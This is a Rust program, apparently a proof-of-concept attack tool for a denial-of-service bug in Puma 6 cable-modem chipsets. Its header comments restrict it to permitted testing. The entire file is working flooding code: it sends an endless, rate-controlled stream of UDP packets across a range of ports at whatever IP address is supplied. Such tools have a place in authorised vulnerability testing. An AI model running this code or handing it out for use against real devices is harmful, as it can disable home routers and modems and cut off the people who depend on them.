// This program is only for use in testing a puma 6 denial of service bug
// Do not use this program without permission from the owner of the target IP
// Attacking a system without permission is illegal in most countries
// and also not very nice

extern crate time;

use std::env;
use std::net::UdpSocket;
use std::thread;

fn zeros(size: usize) -> Vec<u8> {
	let mut zero_vec: Vec<u8> = Vec::with_capacity(size);
	#[allow(unused_variables)]
	for i in 0..size {
		zero_vec.push(0u8);
	}
	return zero_vec;
}

fn main() {
	let args: Vec<_> = env::args().collect();
	let mut target = "0.0.0.0";
	let mut length = 0usize;
	let mut mbper_second = 1f32;
	let mut port_range = 50000;

	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}>", target, length, mbper_second, port_range);

	if args.len() <= 1 {
		panic!("A target IP must be given");
	}

	target = args[1].as_str();

	let source = UdpSocket::bind("0.0.0.0:10000").expect("couldn't bind to address");;
	if args.len() > 2 {
		length = args[2].as_str().parse::<usize>().expect("invalid packet size")
	}
	// 20 byte IP header + 8 byte UDP header + data
	let data = zeros(length);

	if args.len() > 3 {
		mbper_second = args[3].as_str().parse::<f32>().expect("invalid speed")
	}
	let per_second = (1024f32 * 1024f32 * mbper_second) / 8f32;

	if args.len() > 4 {
		port_range = args[4].as_str().parse::<u16>().expect("invalid port count")
	}

	let udp_length = length + 28;
	let ethernet_length = udp_length + 26;
	let packets_per_millisecond = (per_second / (udp_length as f32))/1000f32;
	let pps = packets_per_millisecond*1000f32;
	println!("Sending {} UDP pps, {} bytes payload, {} bytes IP, {} bytes ethernet, to {} ports at {}", pps, length, udp_length, ethernet_length, port_range, target);
	println!("mbps IP traffic: {}, mbps ethernet traffic: {}", pps*(udp_length as f32)/(1024f32*1024f32/8f32), pps*(ethernet_length as f32)/(1024f32*1024f32/8f32));

	let start = time::PreciseTime::now();
	let mut count = 0;
	loop {
		for port in 10000..(10000 + port_range) {
			let result = source.send_to(&data, format!("{}:{}", target, port));
			if result.is_err() {
				println!("Failed to send packet. {}", result.unwrap_err());
			}
			count = count + 1;
			let elapsed = start.to(time::PreciseTime::now()).num_milliseconds();
			if count as f32 / packets_per_millisecond > (elapsed as f32) {
				#[allow(deprecated)]
				thread::sleep_ms(2);
			}
		}
	}
}
